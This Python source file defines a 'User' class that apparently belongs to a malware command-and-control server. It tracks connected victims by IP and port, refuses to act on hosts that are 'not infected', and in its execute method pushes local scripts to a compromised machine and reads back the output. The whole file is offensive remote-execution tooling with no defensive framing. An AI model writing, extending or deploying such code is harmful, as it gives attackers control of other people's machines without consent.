from datetime import datetime
import logging
import asyncio

class User:
    def __init__(
            self, 
            uuid="", 
            ip="", 
            port=0000, 
            reader: asyncio.StreamReader|None=None, 
            writer: asyncio.StreamWriter|None=None, 
            is_admin=False, 
            module_data={},
            connection_time=datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z"),
            first_name="",
            last_name="",
            username=""
        ):
        self.uuid = uuid
        self.ip = ip
        self.port = port
        self.connection_time = connection_time
        self.reader: asyncio.StreamReader|None = reader
        self.writer: asyncio.StreamWriter|None = writer
        self.is_admin = is_admin
        self.module_data = module_data
        self.first_name = first_name
        self.last_name = last_name
        self.username = username
        self.lock = asyncio.Lock()
        
        

    def __repr__(self):
        return f"{self.ip}:{self.port}"
    
    def to_dict(self):
        return {
            'uuid': self.uuid,
            'ip': self.ip,
            'port': self.port,
            'connection_time': self.connection_time,
            'is_admin': self.is_admin,
            'first_name': self.first_name,
            'last_name': self.last_name,
            'username': self.username,
            'module_data': self.module_data,
        }
    
    def set_module_data(self, module_name, data):
        self.module_data[module_name] = data

    def get_module_data(self, module_name):
        return self.module_data.get(module_name, {})

    @classmethod
    def from_dict(cls, data):
        user = cls(
            uuid=data.get('uuid'),
            ip=data.get('ip'),
            port=data.get('port'),
            is_admin=data.get('is_admin'),
            module_data=data.get('module_data'),
            connection_time = data.get('connection_time'),
            first_name = data.get('first_name'),
            last_name = data.get('last_name'),
            username = data.get('username')
        )
        return user
    
    async def execute(self, file_path, replacements={}):
        if not self.is_logged_in():
            logging.error(f"User {self.ip} is not infected")
            raise Exception("User is not infected")
        
        with open(file_path, "rb") as f:
            logging.info(f"Executing {file_path} on {self.ip}")
            content = f.read()
            for key, value in replacements.items():
                content = content.replace(key, value)

            #logging.info(content.decode())
            self.writer.write(b'print("pause||||||")')
            async with self.lock:
                logging.info(f"Lock acquired on {self.ip}")
                self.writer.write(content)

                await self.writer.drain()
            
                output = await self.reader.read(4096)

                logging.info(f"Output for {self.ip}: {output.decode()}")
                return output.decode()
    
    def is_logged_in(self):
        return self.reader is not None and self.writer is not None
    
    async def send(self, message):
        if self.is_logged_in():
            self.writer.write(message.encode())
            await self.writer.drain()
        else:
            raise Exception("Victim is not infected")
    
    async def receive(self, buffer_size=4096):
        if self.is_logged_in():
            return await self.reader.read(buffer_size)
        raise Exception("Victim is not infected")